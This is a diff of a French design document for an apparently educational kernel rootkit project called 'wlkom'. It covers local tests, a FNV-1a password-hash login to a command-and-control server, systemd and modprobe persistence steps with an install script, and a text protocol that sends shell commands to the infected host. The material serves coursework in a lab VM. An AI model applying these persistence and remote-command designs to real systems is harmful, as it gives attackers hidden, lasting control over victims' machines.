@@ -3,6 +3,37 @@
 Approches possibles pour chaque feature **obligatoire**.
 Pour chaque feature : comparatif, recommandation, risques.
 
+## Tests automatisés
+
+Les tests locaux sont écrits en Python dans `tests/run_tests.py`. Ce choix est volontaire :
+
+| Critère | Justification |
+|---|---|
+| Disponibilité | Python 3 est présent sur l'environnement de développement et ne demande pas de dépendance externe. |
+| Tests réseau simples | La bibliothèque standard permet d'ouvrir un port local, de lancer le C2 et de vérifier la première trame TCP envoyée. |
+| Orchestration | Python permet de compiler le C2 avec `make`, de lancer un sous-processus, de choisir un port libre et de nettoyer le process proprement. |
+| Séparation hôte/VM | Les tests locaux valident ce qui peut l'être sans charger de module kernel ; les tests `insmod`, `rmmod`, retry réel et compilation du `.ko` restent faits dans la VM victime. |
+
+### Couverture actuelle
+
+| Feature | Test automatisé | Limite |
+|---|---|---|
+| Compile | Vérifie que `rootkit/Makefile` déclare `wlkom.o` comme LKM et délègue `modules`/`clean` au build system kernel. | La génération réelle de `wlkom.ko` doit être faite dans la VM victime pour garantir le matching avec `uname -r`. |
+| Connection | Vérifie la présence de la kthread, socket TCP kernel, `connect`, `recv`, `shutdown` et retry interruptible. | La connexion réelle et la reconnexion automatique restent validées par test manuel entre les deux VMs. |
+| Password | Lance réellement le C2, se connecte dessus en TCP local, et vérifie l'envoi de `AUTH <hash_fnv1a>\n` avec le hash FNV-1a attendu. Vérifie aussi la logique d'auth côté module. | Le hash choisi est FNV-1a 32-bit : simple, sans dépendance externe, mais non cryptographique. Pour une version plus robuste, remplacer par SHA-256. |
+
+Ces tests ne remplacent pas les tests d'intégration dans QEMU : ils servent de filet rapide avant de recompiler/recharger le module dans la VM.
+
+### Hash du mot de passe
+
+Le protocole d'authentification utilise FNV-1a 32-bit. Le C2 reçoit le mot de passe en clair sur sa ligne de commande, calcule son hash, puis envoie uniquement :
+
+```text
+AUTH <hash_fnv1a>
+```
+
+Le module kernel ne reçoit pas le mot de passe brut : il reçoit `password_hash=<hash_fnv1a>` au chargement. En mode manuel, la valeur peut être passée à `insmod`; en mode persistant, elle est écrite dans `/etc/modprobe.d/wlkom.conf` puis transmise automatiquement par `modprobe wlkom` via `wlkom.service`. Le module compare deux chaînes hexadécimales. Cette solution évite le secret hardcodé et évite de le comparer directement en clair côté kernel. FNV-1a n'est pas cryptographiquement sûr ; il a été choisi ici pour rester autonome, court, reproductible en C userland et facile à vérifier dans le cadre pédagogique.
+
 ---
 
 ## Feature 1 — Compile (0.5pt)
@@ -94,6 +125,8 @@ Le rootkit doit survivre à un reboot **et** se reconnecter au C2.
 
 ### Approche A — Systemd service ✅ Recommandé
 
+Le repo fournit `rootkit/install_persistence.sh`, à lancer sur la VM victime après compilation du module. Il installe `wlkom.ko`, écrit la configuration `modprobe`, crée le service systemd et l'active au boot. Le service utilise `modprobe` plutôt qu'`insmod`, afin de récupérer automatiquement les paramètres depuis `/etc/modprobe.d/wlkom.conf`.
+
 Créer `/etc/systemd/system/wlkom.service` :
 
 ```ini
@@ -103,8 +136,9 @@ After=network-online.target
 Wants=network-online.target
 
 [Service]
-ExecStart=/sbin/insmod /lib/modules/VERSION/extra/wlkom.ko c2_ip=X.X.X.X c2_port=4444
 Type=oneshot
+ExecStart=/sbin/modprobe wlkom
+ExecStop=/sbin/modprobe -r wlkom
 RemainAfterExit=yes
 
 [Install]
@@ -112,18 +146,19 @@ WantedBy=multi-user.target
 ```
 
 ```bash
-cp wlkom.ko /lib/modules/$(uname -r)/extra/
-depmod -a
-systemctl enable wlkom
+cd /mnt/vmshare/rootkit
+make
+sudo ./install_persistence.sh <password_hash> 192.168.100.10 4444
+sudo systemctl start wlkom.service
 ```
 
 | Critère | Note |
 |---|---|
 | Simplicité | Haute |
-| Robustesse | Haute — `After=network-online.target` garantit le réseau avant la connexion |
+| Robustesse | Haute — `After=network-online.target` attend le réseau, et le kthread du module continue de retry si le C2 n'est pas encore prêt |
 | Discrétion | Faible (service visible avec `systemctl list-units`) |
 
-**Risques :** si la victim VM n'a pas systemd (peu probable) → fallback approche B.
+**Risques :** si la victim VM n'a pas systemd (peu probable) → fallback approche B. Si le kernel change, il faut recompiler `wlkom.ko` et relancer `install_persistence.sh`, car le module est installé dans `/lib/modules/$(uname -r)/extra/`.
 
 ---
 
@@ -133,7 +168,7 @@ Ajouter `wlkom` dans `/etc/modules` et les paramètres dans `/etc/modprobe.d/wlk
 
 ```
 # /etc/modprobe.d/wlkom.conf
-options wlkom c2_ip=X.X.X.X c2_port=4444
+options wlkom password_hash=<hash_fnv1a> c2_ip=X.X.X.X c2_port=4444
 ```
 
 | Critère | Note |
@@ -232,7 +267,7 @@ Texte simple, messages délimités par `\n` :
 ```
 # C2 → Rootkit
 CMD <commande shell>\n
-AUTH <password>\n
+AUTH <hash_fnv1a>\n
 
 # Rootkit → C2
 CONNECTED\n
